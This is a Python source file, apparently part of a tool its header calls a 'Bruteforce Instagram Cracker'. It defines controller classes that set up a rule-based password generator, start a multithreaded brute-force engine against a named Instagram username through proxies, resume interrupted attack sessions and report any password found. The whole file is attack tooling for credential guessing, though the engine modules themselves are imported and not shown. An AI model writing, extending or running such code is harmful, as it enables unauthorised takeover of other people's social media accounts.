# Date: 07/12/2018
# Author: Abdulkader Khateeb
# Description: Bruteforce Instagram Cracker

from time import sleep, time
from datetime import datetime
from random import randint
from os.path import exists
from instagram.password_generator import PwdGenerator
from instagram.lib.bruter import Bruter 
from instagram.lib.session import Session 

DEFAULT_THREADS = 10

class Controller():
  def __init__(self, username):
    self.engine = None
    self.threads = DEFAULT_THREADS
    self.p_gen_obj = PwdGenerator()
    self.username = username
    
  def read_file(self, file):
      " Uses a generator to read a large file lazily "
      with open(file, 'r') as f:
          while True:
              data = f.readline().strip()
              if not data:
                  break
              yield data

  def init_data(self):
    data = {
      "suffix_fixed": "3010",
      "prefix_key": "capital_letters",
      "prefix_key_len": 1,
      "prefix_key_confirmed": True,
      "suffix_part_confirmed": True, # other attributes are kept False
      "needed_keys": ['digits', 'symbols', 'small_letters'],
      "key_map": {'symbols': ".@"},
      # "generator_function": self.read_file("test_pwd.lst"),
    }
    self.p_gen_obj.init(data=data) # pass your desired data here
    self.engine = Bruter(self.username.title(), self.p_gen_obj, self.threads)
    self.session = Session(self.username) # args.username.title(), args.wordlist)

class Cracker(Controller):
  def __init__(self, threads):
    self.start_time = 0
    self.threads = threads
   
  def set_username(self, username):
    cont = super()
    cont.__init__(username)
    cont.init_data()
    # self.__setattr__(cont)

  def get_status(self):
    try:
      data = {
        'attempts': self.engine.attempts,
        'ip': '[{}]-{}'.format(self.engine.ip, self.engine.spyder.proxy_info['country']) if all([self.engine.ip, self.engine.spyder.proxy_info]) else '',
        'pwd_buffer': self.engine.passlist,
        'last_password': self.engine.last_password
      }
      return data
    except:
      return {}

  def start(self):
    try:
      self.start_time = time()
      if self.session.exists():
        # if _input('Do you want to resume the attack? [y/n]: ').split()[0][0] == 'y':
        #  we suppose that user always needs to continue previous sessoin
        data = self.session.read()
        if data:
          last_attempts = int(data['generator_seed']) - 1 # to re-test the last password
          self.engine.attempts = last_attempts
          self.engine.pass_gen.skip(last_attempts)
          # self.engine.pass_gen.last_pwd = str(data['last_password']) # no need 
          self.engine.retrieve = True
      
      self.isAlive = True
      self.engine.start()
    except KeyboardInterrupt:
      self.engine.user_abort = True 
    except Exception as ex:
      print(ex)
    finally:
      if all([not self.engine.read, self.engine.user_abort, not self.engine.isFound]):
        print('{}\t[!] Exiting ...'.format(self.engine.threads if not self.engine.spyder.proxy_info else '\n'))

      password = self.engine.last_password if self.engine.isFound else "?"
      self.engine.stop()
      return {'password_found': self.engine.isFound, "password": password}

  def stop(self): 
    self.engine.stop()
    return "Engine stopped"
